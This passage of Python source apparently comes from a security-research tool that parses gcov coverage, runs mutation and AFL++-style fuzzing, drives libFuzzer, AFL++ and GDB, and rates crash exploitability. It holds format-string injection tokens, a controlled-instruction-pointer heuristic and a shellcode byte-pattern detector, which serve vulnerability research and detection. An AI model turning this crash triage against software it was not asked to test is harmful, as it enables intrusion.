            logger.error(f"Failed to parse gcov data: {e}")
            return coverage_info

    def _parse_gcov_file(self, gcov_file):
        """Parse individual .gcov file for detailed coverage information."""
        file_info = {
            "total_lines": 0,
            "executed_lines": 0,
            "line_coverage": {},
            "functions": [],
            "branches": [],
        }

        try:
            with open(gcov_file, encoding="utf-8", errors="ignore") as f:
                current_function = None
                line_num = 0

                for line in f:
                    line = line.strip()
                    if not line:
                        continue

                    # Parse gcov line format: execution_count:line_number:source_code
                    parts = line.split(":", 2)
                    if len(parts) < 3:
                        continue

                    execution_count = parts[0].strip()
                    line_number_str = parts[1].strip()
                    source_code = parts[2] if len(parts) > 2 else ""

                    # Skip metadata lines
                    if not line_number_str.isdigit():
                        continue

                    line_num = int(line_number_str)
                    file_info["total_lines"] = max(file_info["total_lines"], line_num)

                    # Parse execution count
                    if execution_count == "-":
                        # Non-executable line
                        continue
                    if execution_count == "#####":
                        # Unexecuted line
                        file_info["line_coverage"][line_num] = 0
                    else:
                        try:
                            count = int(execution_count)
                            file_info["line_coverage"][line_num] = count
                            if count > 0:
                                file_info["executed_lines"] += 1
                        except ValueError:
                            continue

                    # Detect function definitions
                    if self._is_function_definition(source_code):
                        func_name = self._extract_function_name(source_code)
                        if func_name:
                            current_function = {
                                "name": func_name,
                                "line": line_num,
                                "executed": execution_count != "#####" and execution_count != "-",
                                "execution_count": int(execution_count)
                                if execution_count.isdigit()
                                else 0,
                                "complexity": 1,  # Base complexity
                            }
                            file_info["functions"].append(current_function)

                    # Update function complexity for control flow
                    if current_function and self._is_control_flow(source_code):
                        current_function["complexity"] += 1

                    # Parse branch information
                    if "branch" in line.lower() and execution_count.isdigit():
                        branch_info = {
                            "line": line_num,
                            "taken": int(execution_count) > 0,
                            "count": int(execution_count),
                        }
                        file_info["branches"].append(branch_info)

            return file_info

        except Exception as e:
            logger.error(f"Failed to parse gcov file {gcov_file}: {e}")
            return file_info

    def _is_function_definition(self, source_code):
        """Check if source line contains a function definition."""
        # Simple heuristics for function detection
        func_keywords = ["def ", "function ", "int ", "void ", "static ", "extern "]
        return (
            any(keyword in source_code.lower() for keyword in func_keywords) and "(" in source_code
        )

    def _extract_function_name(self, source_code):
        """Extract function name from source code line."""
        import re

        # Try to extract C/C++ function name
        match = re.search(r"(?:static\s+|extern\s+)?(?:\w+\s+)*(\w+)\s*\(", source_code)
        if match:
            return match.group(1)

        # Try Python function
        match = re.search(r"def\s+(\w+)\s*\(", source_code)
        if match:
            return match.group(1)

        return None

    def _is_control_flow(self, source_code):
        """Check if source line contains control flow statements."""
        control_keywords = ["if", "while", "for", "switch", "case", "else", "elif", "try", "catch"]
        return any(keyword in source_code.lower() for keyword in control_keywords)

    def _identify_hot_spots(self, functions):
        """Identify frequently executed functions (hot spots)."""
        if not functions:
            return []

        # Sort by execution count
        executed_functions = [f for f in functions if f["executed"] and f["execution_count"] > 0]
        executed_functions.sort(key=lambda x: x["execution_count"], reverse=True)

        # Return top 10 hot spots
        return executed_functions[:10]

    def _identify_cold_spots(self, functions):
        """Identify unexecuted or rarely executed functions (cold spots)."""
        if not functions:
            return []

        # Find unexecuted functions
        cold_functions = [f for f in functions if not f["executed"] or f["execution_count"] == 0]

        # Add rarely executed functions (bottom 20% of executed functions)
        executed_functions = [f for f in functions if f["executed"] and f["execution_count"] > 0]
        if executed_functions:
            executed_functions.sort(key=lambda x: x["execution_count"])
            rarely_executed = executed_functions[: max(1, len(executed_functions) // 5)]
            cold_functions.extend(rarely_executed)

        return cold_functions

    def _generate_coverage_report(self, coverage_info, output_file=None):
        """Generate comprehensive coverage report from gcov data."""
        try:
            summary = coverage_info["summary"]

            # Calculate percentages
            line_coverage = (
                (summary["executed_lines"] / summary["total_lines"] * 100)
                if summary["total_lines"] > 0
                else 0
            )
            function_coverage = (
                (summary["executed_functions"] / summary["total_functions"] * 100)
                if summary["total_functions"] > 0
                else 0
            )
            branch_coverage = (
                (summary["taken_branches"] / summary["total_branches"] * 100)
                if summary["total_branches"] > 0
                else 0
            )

            report = {
                "timestamp": datetime.now().isoformat(),
                "summary": {
                    "line_coverage_percent": round(line_coverage, 2),
                    "function_coverage_percent": round(function_coverage, 2),
                    "branch_coverage_percent": round(branch_coverage, 2),
                    "total_lines": summary["total_lines"],
                    "executed_lines": summary["executed_lines"],
                    "total_functions": summary["total_functions"],
                    "executed_functions": summary["executed_functions"],
                    "total_branches": summary["total_branches"],
                    "taken_branches": summary["taken_branches"],
                },
                "files": {},
                "hot_spots": coverage_info["hot_spots"][:5],  # Top 5
                "cold_spots": coverage_info["cold_spots"][:10],  # Top 10 unexecuted
                "recommendations": [],
            }

            # Add file-level coverage
            for filename, file_info in coverage_info["files"].items():
                file_coverage = (
                    (file_info["executed_lines"] / file_info["total_lines"] * 100)
                    if file_info["total_lines"] > 0
                    else 0
                )
                report["files"][filename] = {
                    "coverage_percent": round(file_coverage, 2),
                    "executed_lines": file_info["executed_lines"],
                    "total_lines": file_info["total_lines"],
                    "functions": len(file_info["functions"]),
                }

            # Generate recommendations
            if line_coverage < 50:
                report["recommendations"].append(
                    "Low line coverage detected. Consider adding more test cases."
                )
            if function_coverage < 70:
                report["recommendations"].append(
                    "Many functions remain untested. Focus on untested functions."
                )
            if len(coverage_info["cold_spots"]) > 10:
                report["recommendations"].append("Many cold spots found. Review unused code paths.")
            if branch_coverage < 60:
                report["recommendations"].append(
                    "Low branch coverage. Add tests for conditional logic."
                )

            # Save report if output file specified
            if output_file:
                with open(output_file, "w") as f:
                    json.dump(report, f, indent=2)
                logger.info(f"Coverage report saved to {output_file}")

            return report

        except Exception as e:
            logger.error(f"Failed to generate coverage report: {e}")
            return None

    def _visualize_coverage_data(self, coverage_info):
        """Create visualization data for coverage display."""
        try:
            visualization_data = {
                "coverage_chart": {
                    "labels": ["Line Coverage", "Function Coverage", "Branch Coverage"],
                    "values": [],
                },
                "file_coverage_map": {},
                "hot_cold_comparison": {"hot_spots": [], "cold_spots": []},
                "complexity_analysis": [],
            }

            summary = coverage_info["summary"]

            # Calculate coverage percentages
            line_coverage = (
                (summary["executed_lines"] / summary["total_lines"] * 100)
                if summary["total_lines"] > 0
                else 0
            )
            function_coverage = (
                (summary["executed_functions"] / summary["total_functions"] * 100)
                if summary["total_functions"] > 0
                else 0
            )
            branch_coverage = (
                (summary["taken_branches"] / summary["total_branches"] * 100)
                if summary["total_branches"] > 0
                else 0
            )

            visualization_data["coverage_chart"]["values"] = [
                round(line_coverage, 1),
                round(function_coverage, 1),
                round(branch_coverage, 1),
            ]

            # File coverage map
            for filename, file_info in coverage_info["files"].items():
                file_coverage = (
                    (file_info["executed_lines"] / file_info["total_lines"] * 100)
                    if file_info["total_lines"] > 0
                    else 0
                )
                visualization_data["file_coverage_map"][filename] = {
                    "coverage": round(file_coverage, 1),
                    "color": self._get_coverage_color(file_coverage),
                }

            # Hot/cold spots for comparison
            visualization_data["hot_cold_comparison"]["hot_spots"] = [
                {"name": f["name"], "count": f["execution_count"], "file": f.get("file", "unknown")}
                for f in coverage_info["hot_spots"][:5]
            ]

            visualization_data["hot_cold_comparison"]["cold_spots"] = [
                {
                    "name": f["name"],
                    "file": f.get("file", "unknown"),
                    "reason": "never executed" if not f["executed"] else "rarely executed",
                }
                for f in coverage_info["cold_spots"][:5]
            ]

            # Complexity analysis
            functions_by_complexity = sorted(
                coverage_info["functions"],
                key=lambda x: x.get("complexity", 1),
                reverse=True,
            )
            visualization_data["complexity_analysis"] = [
                {
                    "name": f["name"],
                    "complexity": f.get("complexity", 1),
                    "executed": f["executed"],
                    "file": f.get("file", "unknown"),
                }
                for f in functions_by_complexity[:10]
            ]

            return visualization_data

        except Exception as e:
            logger.error(f"Failed to create visualization data: {e}")
            return None

    def _get_coverage_color(self, coverage_percent):
        """Get color code based on coverage percentage."""
        if coverage_percent >= 80:
            return "#4CAF50"  # Green
        if coverage_percent >= 60:
            return "#FF9800"  # Orange
        if coverage_percent >= 40:
            return "#FF5722"  # Red-Orange
        return "#F44336"  # Red

    def _mutation_fuzzing(self, seed_case, execution_result):
        """Mutation-based fuzzing strategy."""
        import random

        mutations = []

        for _ in range(5):
            mutated = bytearray(seed_case)

            # Bit flipping
            if mutated:
                pos = random.randint(0, len(mutated) - 1)  # noqa: S311
                mutated[pos] ^= 1 << random.randint(0, 7)  # noqa: S311

            # Byte insertion
            if len(mutated) < 8192:
                pos = random.randint(0, len(mutated))  # noqa: S311
                mutated.insert(pos, random.randint(0, 255))  # noqa: S311

            # Byte deletion
            if len(mutated) > 1:
                pos = random.randint(0, len(mutated) - 1)  # noqa: S311
                del mutated[pos]

            mutations.append(bytes(mutated))

        return mutations

    def _generation_fuzzing(self, seed_case, execution_result):
        """Generation-based fuzzing strategy."""
        import random

        generated = []

        # Generate based on execution feedback
        coverage = execution_result.get("coverage", {})
        target_size = coverage.get("basic_blocks", 100) * 10

        for _ in range(3):
            # Structure-aware generation
            test_case = b""

            # Add magic bytes
            magic_bytes = [b"MZ", b"\x7fELF", b"PK", b"\xff\xd8\xff"]
            test_case += random.choice(magic_bytes)  # noqa: S311

            # Add structured data
            while len(test_case) < target_size:
                chunk_type = random.choice(["random", "pattern", "string"])  # noqa: S311

                if chunk_type == "random":
                    chunk = bytes([random.randint(0, 255) for _ in range(random.randint(1, 100))])  # noqa: S311
                elif chunk_type == "pattern":
                    pattern = bytes([random.randint(0, 255)]) * random.randint(10, 100)  # noqa: S311
                    chunk = pattern
                else:  # string
                    chunk = b"A" * random.randint(10, 200)  # noqa: S311

                test_case += chunk

            generated.append(test_case)

        return generated

    def _hybrid_fuzzing(self, seed_case, execution_result):
        """Hybrid fuzzing combining mutation and generation."""
        mutations = self._mutation_fuzzing(seed_case, execution_result)
        generated = self._generation_fuzzing(seed_case, execution_result)
        return mutations + generated

    def _afl_plus_plus_fuzzing(self, seed_case, execution_result):
        """AFL++ inspired fuzzing with havoc mutations and deterministic stages."""
        test_cases = []

        # Deterministic stage - bit flips
        for i in range(min(len(seed_case), 128)):
            for bit in range(8):
                test_case = bytearray(seed_case)
                test_case[i] ^= 1 << bit
                test_cases.append(bytes(test_case))

        # Arithmetic mutations
        for i in range(min(len(seed_case) - 3, 64)):
            test_case = bytearray(seed_case)
            # Add/subtract small integers
            val = struct.unpack("<I", test_case[i : i + 4])[0]
            for delta in [-1, 1, -16, 16, -128, 128]:
                new_val = (val + delta) & 0xFFFFFFFF
                test_case[i : i + 4] = struct.pack("<I", new_val)
                test_cases.append(bytes(test_case))

        # Havoc stage - random mutations
        havoc_cycles = 256 if execution_result.get("coverage_new", False) else 128
        for _ in range(havoc_cycles):
            test_case = bytearray(seed_case)

            # Random number of stacked mutations
            num_mutations = random.randint(1, 16)  # noqa: S311 - Fuzzing engine mutation count generation
            for _ in range(num_mutations):
                mutation_type = random.randint(0, 10)  # noqa: S311 - Fuzzing engine mutation type selection

                if mutation_type == 0:  # Bit flip
                    if test_case:
                        pos = random.randint(0, len(test_case) - 1)  # noqa: S311 - Fuzzing engine bit flip position
                        test_case[pos] ^= 1 << random.randint(0, 7)  # noqa: S311 - Fuzzing engine bit flip mask

                elif mutation_type == 1:  # Byte flip
                    if test_case:
                        pos = random.randint(0, len(test_case) - 1)  # noqa: S311 - Fuzzing engine byte flip position
                        test_case[pos] ^= 0xFF

                elif mutation_type == 2:  # Insert random bytes
                    pos = random.randint(0, len(test_case))  # noqa: S311 - Fuzzing engine byte insertion position
                    test_case.insert(pos, random.randint(0, 255))  # noqa: S311 - Fuzzing engine random byte insertion

                elif mutation_type == 3:  # Delete bytes
                    if len(test_case) > 1:
                        pos = random.randint(0, len(test_case) - 1)  # noqa: S311 - Fuzzing engine byte deletion position
                        del test_case[pos]

                elif mutation_type == 4:  # Splice
                    if len(test_case) > 4:
                        # Splice with interesting values
                        interesting = [0, 1, -1, 255, 256, 32767, -32768, 65535, -65536]
                        pos = random.randint(0, len(test_case) - 4)  # noqa: S311 - Fuzzing engine splice position
                        val = random.choice(interesting)  # noqa: S311 - Fuzzing engine interesting value selection
                        test_case[pos : pos + 4] = struct.pack("<i", val)

                elif mutation_type == 5:  # Dictionary insertion
                    if hasattr(self, "fuzzing_dict") and self.fuzzing_dict:
                        token = random.choice(list(self.fuzzing_dict))  # noqa: S311 - Fuzzing engine dictionary token selection
                        pos = random.randint(0, max(0, len(test_case) - len(token)))  # noqa: S311 - Fuzzing engine dictionary insertion position
                        test_case[pos : pos + len(token)] = token.encode()[: len(test_case) - pos]

                elif mutation_type == 6:  # Overwrite with pattern
                    patterns = [
                        b"\x00\x00\x00\x00",
                        b"\xff\xff\xff\xff",
                        b"\x41\x41\x41\x41",
                        b"\x0a\x0d\x0a\x0d",
                    ]
                    pattern = random.choice(patterns)  # noqa: S311 - Fuzzing engine pattern selection
                    if len(test_case) >= len(pattern):
                        pos = random.randint(0, len(test_case) - len(pattern))  # noqa: S311 - Fuzzing engine pattern overwrite position
                        test_case[pos : pos + len(pattern)] = pattern

                elif mutation_type == 7:  # Arithmetic operations
                    if len(test_case) >= 4:
                        pos = random.randint(0, len(test_case) - 4)  # noqa: S311 - Fuzzing engine arithmetic operation position
                        val = struct.unpack("<I", test_case[pos : pos + 4])[0]
                        op = random.choice(  # noqa: S311 - Fuzzing engine arithmetic operation selection
                            [lambda x: x + 1, lambda x: x - 1, lambda x: x * 2, lambda x: x // 2]
                        )
                        new_val = op(val) & 0xFFFFFFFF
                        test_case[pos : pos + 4] = struct.pack("<I", new_val)

                elif mutation_type == 8:  # Clone bytes
                    if len(test_case) > 1:
                        length = random.randint(1, min(16, len(test_case) // 2))  # noqa: S311 - Fuzzing engine clone length
                        src = random.randint(0, len(test_case) - length)  # noqa: S311 - Fuzzing engine clone source position
                        dst = random.randint(0, len(test_case))  # noqa: S311 - Fuzzing engine clone destination position
                        chunk = test_case[src : src + length]
                        test_case[dst:dst] = chunk

                elif mutation_type == 9:  # Swap bytes
                    if len(test_case) > 4:
                        pos1 = random.randint(0, len(test_case) - 2)  # noqa: S311 - Fuzzing engine swap position 1
                        pos2 = random.randint(0, len(test_case) - 2)  # noqa: S311 - Fuzzing engine swap position 2
                        test_case[pos1], test_case[pos2] = test_case[pos2], test_case[pos1]

                elif mutation_type == 10:  # Format string injection
                    fmt_strings = [b"%s%s%s", b"%n%n%n", b"%x%x%x", b"%d%d%d"]
                    fmt = random.choice(fmt_strings)  # noqa: S311 - Fuzzing engine format string selection
                    if len(test_case) >= len(fmt):
                        pos = random.randint(0, len(test_case) - len(fmt))  # noqa: S311 - Fuzzing engine format string injection position
                        test_case[pos : pos + len(fmt)] = fmt

            test_cases.append(bytes(test_case))

        return test_cases

    def _hash_crash(self, crash_result):
        """Generate unique hash for crash deduplication."""
        import hashlib

        crash_data = f"{crash_result.get('crash_type', '')}:{crash_result.get('pc', 0)}"
        return hashlib.sha256(crash_data.encode()).hexdigest()[:16]

    def _assess_exploitability(self, crash_result):
        """Assess crash exploitability."""
        crash_type = crash_result.get("crash_type", "")
        pc = crash_result.get("pc", 0)

        if crash_type == "segfault":
            if pc == 0x41414141:  # Controlled EIP
                return "HIGH"
            if pc > 0x10000000:  # Userland address
                return "MEDIUM"
            return "LOW"
        if crash_type == "exception":
            return "MEDIUM"
        return "LOW"

    def _update_coverage(self, coverage_data):
        """Update global coverage tracking."""
        for key, value in coverage_data.items():
            if key not in self.coverage_data:
                self.coverage_data[key] = set()
            if isinstance(value, (list, tuple)):
                self.coverage_data[key].update(value)
            else:
                self.coverage_data[key].add(value)

    def _generate_report(self):
        """Generate comprehensive fuzzing report."""
        session = self.session_data

        return {
            "success": True,
            "duration": time.time() - session["start_time"],
            "test_cases_executed": session["test_cases"],
            "unique_crashes": len(session["unique_crashes"]),
            "total_crashes": self.crash_count,
            "crashes": session["crashes"],
            "coverage_summary": {
                "unique_basic_blocks": len(self.coverage_data.get("basic_blocks", [])),
                "unique_functions": len(self.coverage_data.get("functions", [])),
                "unique_branches": len(self.coverage_data.get("branches", [])),
            },
            "exploitable_crashes": len(
                [c for c in session["crashes"] if c["exploitability"] == "HIGH"]
            ),
        }

    # Enhanced Fuzzing Integration - Production-ready extensions

    def _setup_grammar_based_fuzzer(self, target_format):
        """Set up grammar-based fuzzing for structured input formats."""
        grammars = {
            "json": {
                "rules": {
                    "object": '"{}" : {}',
                    "array": '[{}]',
                    "string": '"{}"',
                    "number": "{}",
                    "boolean": "{}",
                    "null": "null"
                },
                "tokens": [
                    "true", "false", "null", '""', "0", "-1", "1.0",
                    '"\\u0000"', '"\\n\\r\\t"', '"\\"\\\\\\/"'
                ]
            },
            "xml": {
                "rules": {
                    "element": '<{}>{}</{}>',
                    "attribute": '{}="{}"',
                    "cdata": '<![CDATA[{}]]>',
                    "comment": '<!-- {} -->'
                },
                "tokens": [
                    "root", "data", "item", "test", "value",
                    "&lt;", "&gt;", "&amp;", "&quot;", "&apos;"
                ]
            },
            "binary": {
                "rules": {
                    "header": b'\x00\x01\x02\x03',
                    "length_field": b'\x00\x00\x00{}',
                    "string_field": b'{}' + b'\x00',
                    "padding": b'\x00' * 4
                },
                "tokens": [
                    b'\xff\xff\xff\xff', b'\x00\x00\x00\x00',
                    b'\xde\xad\xbe\xef', b'\x41\x41\x41\x41'
                ]
            }
        }

        return grammars.get(target_format, grammars["binary"])

    def _libfuzzer_integration(self, target_binary, corpus_dir, duration):
        """Integrate with libFuzzer for coverage-guided fuzzing."""
        import subprocess
        import tempfile

        # Check for libFuzzer-compiled binary
        if not self._is_libfuzzer_instrumented(target_binary):
            logger.warning("Binary not compiled with libFuzzer, attempting clang integration")
            return self._attempt_clang_libfuzzer_build(target_binary)

        try:
            # Prepare output directories
            with tempfile.TemporaryDirectory() as work_dir:
                crashes_dir = os.path.join(work_dir, "crashes")
                os.makedirs(crashes_dir, exist_ok=True)

                # LibFuzzer command with comprehensive options
                cmd = [
                    target_binary,
                    corpus_dir,
                    f"-artifact_prefix={crashes_dir}/crash-",
                    f"-max_total_time={duration}",
                    "-print_stats=1",
                    "-reduce_inputs=1",
                    "-use_value_profile=1",
                    "-shrink=1",
                    "-detect_leaks=1",
                    "-handle_segv=1",
                    "-handle_bus=1",
                    "-handle_abrt=1",
                    "-handle_ill=1",
                    "-handle_fpe=1",
                    "-rss_limit_mb=2048"
                ]

                logger.info(f"Starting libFuzzer: {' '.join(cmd)}")

                process = subprocess.Popen(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=False
                )

                # Monitor progress and collect statistics
                stats = {"executions": 0, "features": 0, "crashes": 0}

                while process.poll() is None:
                    line = process.stderr.readline()
                    if line:
                        # Parse libFuzzer statistics
                        if "exec/s:" in line:
                            exec_match = re.search(r'(\d+) exec/s', line)
                            if exec_match:
                                stats["executions"] += int(exec_match.group(1))

                        if "ft:" in line:
                            ft_match = re.search(r'ft: (\d+)', line)
                            if ft_match:
                                stats["features"] = int(ft_match.group(1))

                # Collect crash files
                crash_files = []
                if os.path.exists(crashes_dir):
                    crash_files = [
                        os.path.join(crashes_dir, f)
                        for f in os.listdir(crashes_dir)
                        if f.startswith("crash-")
                    ]

                return {
                    "success": True,
                    "statistics": stats,
                    "crashes": len(crash_files),
                    "crash_files": crash_files
                }

        except Exception as e:
            logger.error(f"LibFuzzer integration failed: {e}")
            return {"success": False, "error": str(e)}

    def _is_libfuzzer_instrumented(self, binary_path):
        """Check if binary was compiled with libFuzzer instrumentation."""
        try:
            with open(binary_path, "rb") as f:
                data = f.read(1024 * 1024)
                libfuzzer_signatures = [
                    b"__sanitizer_cov_trace_pc_guard",
                    b"LLVMFuzzerTestOneInput",
                    b"__libfuzzer_",
                    b"fuzzer-no-link"
                ]
                return any(sig in data for sig in libfuzzer_signatures)
        except Exception:
            return False

    def _attempt_clang_libfuzzer_build(self, source_path):
        """Attempt to build target with libFuzzer if source is available."""
        import shutil

        clang_path = shutil.which("clang++") or shutil.which("clang")
        if not clang_path:
            return {"success": False, "error": "Clang compiler not found"}

        # Check if source code is available
        source_extensions = [".c", ".cpp", ".cc", ".cxx"]
        source_file = None

        for ext in source_extensions:
            potential_source = source_path.rsplit(".", 1)[0] + ext
            if os.path.exists(potential_source):
                source_file = potential_source
                break

        if not source_file:
            return {"success": False, "error": "Source code not available for libFuzzer build"}

        try:
            output_path = source_path + "_libfuzzer"
            cmd = [
                clang_path,
                "-fsanitize=fuzzer,address",
                "-g", "-O2",
                source_file,
                "-o", output_path
            ]

            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                cmd, capture_output=True, text=True, check=True, shell=False
            )

            return {
                "success": True,
                "instrumented_binary": output_path,
                "build_log": result.stdout
            }

        except subprocess.CalledProcessError as e:
            return {
                "success": False,
                "error": f"Clang build failed: {e.stderr}"
            }

    def _enhanced_afl_integration(self, target_path, input_dir, output_dir, duration, options=None):
        """Enhanced AFL++ integration with advanced features."""
        import shutil
        import subprocess

        options = options or {}

        # Find AFL++ tools
        afl_tools = {
            "fuzz": shutil.which("afl-fuzz"),
            "cmin": shutil.which("afl-cmin"),
            "tmin": shutil.which("afl-tmin"),
            "showmap": shutil.which("afl-showmap"),
            "analyze": shutil.which("afl-analyze")
        }

        missing_tools = [tool for tool, path in afl_tools.items() if not path]
        if missing_tools:
            logger.warning(f"AFL++ tools not found: {missing_tools}")
            return {"success": False, "error": f"Missing AFL++ tools: {missing_tools}"}

        try:
            # Step 1: Minimize corpus with afl-cmin
            minimized_dir = os.path.join(output_dir, "minimized_corpus")
            os.makedirs(minimized_dir, exist_ok=True)

            cmin_cmd = [
                afl_tools["cmin"],
                "-i", input_dir,
                "-o", minimized_dir,
                "--", target_path, "@@"
            ]

            logger.info("Minimizing corpus with afl-cmin")
            subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                cmin_cmd, check=True, capture_output=True, shell=False
            )

            # Step 2: Setup parallel fuzzing instances
            parallel_instances = options.get("parallel_instances", 4)
            fuzzer_processes = []

            for i in range(parallel_instances):
                instance_output = os.path.join(output_dir, f"instance_{i}")
                os.makedirs(instance_output, exist_ok=True)

                cmd = [
                    afl_tools["fuzz"],
                    "-i", minimized_dir if i == 0 else "-",
                    "-o", instance_output,
                    "-M" if i == 0 else "-S", f"fuzzer_{i}",
                    "-t", str(options.get("timeout", 1000)),
                    "-m", str(options.get("memory_limit", "none")),
                    "-V", str(duration // parallel_instances),
                ]

                # Add specialized options per instance
                if i == 0:  # Master instance
                    cmd.extend(["-d"])  # Deterministic mode
                elif i == 1:  # Fast mutations
                    cmd.extend(["-L", "0"])  # No havoc mutations
                elif i == 2:  # Dictionary mode
                    dict_file = self._create_afl_dictionary(target_path)
                    if dict_file:
                        cmd.extend(["-x", dict_file])

                # Add binary and placeholder
                cmd.extend(["--", target_path, "@@"])

                # Setup environment for this instance
                env = self._setup_afl_environment(instance_output)
                env["AFL_FINAL_SYNC"] = "1"

                process = subprocess.Popen(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                    cmd, env=env,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=False
                )
                fuzzer_processes.append(process)

            # Monitor all instances
            all_stats = {}
            for i, process in enumerate(fuzzer_processes):
                stats = self._monitor_afl_instance(process, f"instance_{i}")
                all_stats[f"instance_{i}"] = stats

            # Collect and deduplicate crashes
            all_crashes = self._collect_afl_crashes(output_dir)

            # Analyze interesting crashes
            crash_analysis = self._analyze_afl_crashes(target_path, all_crashes)

            return {
                "success": True,
                "statistics": all_stats,
                "total_crashes": len(all_crashes),
                "crash_analysis": crash_analysis,
                "corpus_minimized": True
            }

        except Exception as e:
            logger.error(f"Enhanced AFL++ integration failed: {e}")
            return {"success": False, "error": str(e)}

    def _create_afl_dictionary(self, target_path):
        """Create AFL++ dictionary from binary strings."""
        import tempfile

        try:
            with open(target_path, "rb") as f:
                binary_data = f.read()

            # Extract strings using a simple approach
            strings = []
            current_string = b""

            for byte in binary_data:
                if 32 <= byte <= 126:  # Printable ASCII
                    current_string += bytes([byte])
                else:
                    if len(current_string) >= 4:  # Minimum string length
                        strings.append(current_string)
                    current_string = b""

            # Create temporary dictionary file
            dict_fd, dict_path = tempfile.mkstemp(suffix=".dict", prefix="afl_")

            with os.fdopen(dict_fd, "w") as f:
                for i, s in enumerate(strings[:1000]):  # Limit to 1000 strings
                    try:
                        # AFL++ dictionary format
                        f.write(f'string_{i}="{s.decode("ascii", errors="ignore")}"\n')
                    except (UnicodeDecodeError, AttributeError) as e:
                        logger.debug(f"Failed to write dictionary entry: {e}")
                        continue

            return dict_path

        except Exception as e:
            logger.error(f"Failed to create AFL++ dictionary: {e}")
            return None

    def _collect_afl_crashes(self, output_dir):
        """Collect all crashes from AFL++ parallel instances."""
        all_crashes = []

        for instance_dir in os.listdir(output_dir):
            if instance_dir.startswith("instance_"):
                crashes_dir = os.path.join(output_dir, instance_dir, "crashes")
                if os.path.exists(crashes_dir):
                    for crash_file in os.listdir(crashes_dir):
                        if crash_file != "README.txt":
                            crash_path = os.path.join(crashes_dir, crash_file)
                            all_crashes.append({
                                "file": crash_path,
                                "instance": instance_dir,
                                "name": crash_file
                            })

        return all_crashes

    def _analyze_afl_crashes(self, target_path, crashes):
        """Analyze AFL++ crashes for exploitability."""
        analysis_results = []

        for crash in crashes[:10]:  # Analyze first 10 crashes
            try:
                # Use GDB for crash analysis if available
                analysis = self._gdb_crash_analysis(target_path, crash["file"])
                if not analysis:
                    # Fallback to basic analysis
                    analysis = self._basic_crash_analysis(target_path, crash["file"])

                analysis_results.append({
                    "crash_file": crash["file"],
                    "analysis": analysis
                })

            except Exception as e:
                logger.error(f"Failed to analyze crash {crash['file']}: {e}")

        return analysis_results

    def _gdb_crash_analysis(self, target_path, crash_file):
        """Analyze crash using GDB for detailed exploitability assessment."""
        import shutil
        import subprocess

        gdb_path = shutil.which("gdb")
        if not gdb_path:
            return None

        try:
            # Create GDB script for automated analysis
            gdb_commands = [
                "set pagination off",
                "set confirm off",
                f"file {target_path}",
                f"run < {crash_file}",
                "bt",
                "info registers",
                "x/20i $rip",
                "quit"
            ]

            gdb_script = "\n".join(gdb_commands)

            # Run GDB analysis
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                [gdb_path, "--batch", "--command=-"],
                input=gdb_script,
                capture_output=True,
                text=True,
                timeout=30,
                shell=False
            )

            # Parse GDB output for exploitability indicators
            output = result.stdout + result.stderr

            exploitability = "LOW"
            indicators = []

            if "SIGSEGV" in output:
                indicators.append("Segmentation fault")
                if "0x41414141" in output or "0x4141414141414141" in output:
                    exploitability = "HIGH"
                    indicators.append("Controlled instruction pointer")
                elif "movaps" in output.lower():
                    exploitability = "MEDIUM"
                    indicators.append("Stack alignment issue")

            if "SIGFPE" in output:
                indicators.append("Floating point exception")
                exploitability = "MEDIUM"

            if "double free" in output.lower():
                indicators.append("Double free detected")
                exploitability = "HIGH"

            return {
                "exploitability": exploitability,
                "indicators": indicators,
                "gdb_output": output[:1000]  # First 1000 chars
            }

        except Exception as e:
            logger.error(f"GDB analysis failed: {e}")
            return None

    def _basic_crash_analysis(self, target_path, crash_file):
        """Basic crash analysis without GDB."""
        try:
            # Read crash input to look for patterns
            with open(crash_file, "rb") as f:
                crash_input = f.read()

            analysis = {
                "input_size": len(crash_input),
                "contains_shellcode": self._detect_shellcode_patterns(crash_input),
                "contains_format_strings": b"%n" in crash_input or b"%s" in crash_input,
                "buffer_overflow_likely": b"A" * 100 in crash_input,
                "exploitability": "UNKNOWN"
            }

            # Basic exploitability assessment
            if analysis["contains_shellcode"]:
                analysis["exploitability"] = "HIGH"
            elif analysis["buffer_overflow_likely"]:
                analysis["exploitability"] = "MEDIUM"
            elif analysis["contains_format_strings"]:
                analysis["exploitability"] = "MEDIUM"
            else:
                analysis["exploitability"] = "LOW"

            return analysis

        except Exception as e:
            logger.error(f"Basic crash analysis failed: {e}")
            return {"exploitability": "UNKNOWN", "error": str(e)}

    def _detect_shellcode_patterns(self, data):
        """Detect potential shellcode patterns in input data."""
        shellcode_patterns = [
            b"\x31\xc0",  # xor eax, eax
            b"\x50\x68",  # push eax; push
            b"\x89\xe3",  # mov ebx, esp
            b"\x6a\x0b",  # push 0xb
            b"\x58",      # pop eax
            b"\xcd\x80",  # int 0x80
            b"\x48\x31\xff",  # xor rdi, rdi (x64)
            b"\x48\x89\xc7",  # mov rdi, rax (x64)
        ]

        return any(pattern in data for pattern in shellcode_patterns)

    def _evolutionary_fuzzer(self, seed_cases, target_binary, generations=50):
        """Implement evolutionary fuzzing algorithm."""
        population_size = min(len(seed_cases), 100)
        current_population = list(seed_cases[:population_size])

        for generation in range(generations):
            # Evaluate fitness for each individual
            fitness_scores = []
            for individual in current_population:
                result = self._execute_test_case(target_binary, individual)
                fitness = self._calculate_fitness(result)
                fitness_scores.append((individual, fitness, result))

            # Sort by fitness (higher is better)
            fitness_scores.sort(key=lambda x: x[1], reverse=True)

            # Selection: keep top 50%
            survivors = [item[0] for item in fitness_scores[:population_size//2]]

            # Reproduction: crossover and mutation
            next_generation = list(survivors)  # Elitism

            while len(next_generation) < population_size:
                # Select parents
                parent1 = self._tournament_selection(survivors, fitness_scores)
                parent2 = self._tournament_selection(survivors, fitness_scores)

                # Crossover
                child = self._crossover(parent1, parent2)

                # Mutation
                if random.random() < 0.1:  # noqa: S311 - Genetic algorithm mutation probability (10% rate)
                    child = self._mutate_individual(child)

                next_generation.append(child)

            current_population = next_generation

            # Log progress
            best_fitness = max(score[1] for score in fitness_scores)
            logger.info(f"Generation {generation}: Best fitness = {best_fitness}")

        return current_population

